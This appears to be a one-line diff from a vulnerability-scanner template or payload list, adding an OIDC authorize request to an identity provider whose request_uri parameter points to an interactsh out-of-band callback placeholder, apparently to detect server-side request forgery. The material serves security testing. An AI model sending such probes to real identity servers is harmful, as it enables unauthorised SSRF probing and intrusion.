@@ -1,0 +1,1 @@
+/idp/profile/oidc/authorize?client_id=demo_rp&request_uri=https://{{interactsh-url}}
